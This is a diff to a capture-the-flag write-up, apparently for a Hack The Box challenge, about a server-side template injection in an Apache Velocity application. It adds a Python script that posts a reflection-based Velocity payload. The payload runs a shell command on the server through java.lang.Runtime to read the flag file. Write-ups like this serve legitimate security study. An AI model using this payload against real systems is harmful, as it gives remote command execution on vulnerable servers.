@@ -5,4 +5,42 @@ You and your faction find yourselves cornered in a refuge corridor inside a maze
 
 In src/java from Main.java we can see that it uses the velocity Template which is vulnerable to ssti.
 
+Reference: 
 `https://iwconnect.com/apache-velocity-server-side-template-injection/`
+<br></br>
+```py
+from requests import *
+import re
+url="http://94.237.49.166:42561/"
+injection='''
+#set($s="")
+#set($stringClass=$s.getClass())
+#set($stringBuilderClass=$stringClass.forName("java.lang.StringBuilder"))
+#set($inputStreamClass=$stringClass.forName("java.io.InputStream"))
+#set($readerClass=$stringClass.forName("java.io.Reader"))
+#set($inputStreamReaderClass=$stringClass.forName("java.io.InputStreamReader"))
+#set($bufferedReaderClass=$stringClass.forName("java.io.BufferedReader"))
+#set($collectorsClass=$stringClass.forName("java.util.stream.Collectors"))
+#set($systemClass=$stringClass.forName("java.lang.System"))
+#set($stringBuilderConstructor=$stringBuilderClass.getConstructor())
+#set($inputStreamReaderConstructor=$inputStreamReaderClass.getConstructor($inputStreamClass))
+#set($bufferedReaderConstructor=$bufferedReaderClass.getConstructor($readerClass))
+
+#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
+#set($process=$runtime.exec("cat ../flag1cb3464ee1.txt"))
+#set($null=$process.waitFor() )
+
+#set($inputStream=$process.getInputStream())
+#set($inputStreamReader=$inputStreamReaderConstructor.newInstance($inputStream))
+#set($bufferedReader=$bufferedReaderConstructor.newInstance($inputStreamReader))
+#set($stringBuilder=$stringBuilderConstructor.newInstance())
+
+#set($output=$bufferedReader.lines().collect($collectorsClass.joining($systemClass.lineSeparator())))
+
+$output
+'''
+data={"text":injection}
+pattern = r'HTB\{.*\}'
+r=post(url,data=data)
+flag = re.findall(pattern, r.text)
+print(flag)```
